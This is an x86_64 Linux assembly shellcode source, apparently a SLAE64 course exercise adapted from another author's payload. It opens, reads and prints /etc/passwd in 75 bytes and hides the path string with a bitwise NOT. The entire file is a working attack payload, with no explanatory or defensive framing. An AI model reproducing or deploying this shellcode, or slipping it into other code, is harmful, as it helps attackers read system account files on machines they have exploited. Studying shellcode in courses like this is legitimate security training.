BITS 64
;Original Author Mr.Un1k0d3r - RingZer0 Team
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes
; Modified by Christophe G slae64 - 1337
; New size 75 bytes


global _start

_start:
  xor r9 , r9
  push dword 0x64777373            ; "sswd"
  mov rdi , 0x9e8fd0d09c8b9ad0     ; "/etc/passwd" , one part is "noted"
  not rdi
  push rdi
  push rsp
  pop rdi


  mul r9   ; set rax , rdx
  add al, 2
  xor rsi, rsi ; set O_RDONLY flag
  syscall

      ; syscall read file
 sub sp, 0xfff   ; allocate space in stack
 push rsp
 pop rsi
 xchg rdi, rax
 mov dx, 0xfff; size to read
 push r9
 pop rax
 syscall

; syscall write to stdout
  push r9
  pop rdi
  add dil, 1 ; set stdout fd = 1
  xchg rdx, rax
  push r9
  pop rax
  inc al
  syscall

; syscall exit
  push r9
  pop rax
  add al, 60
  syscall

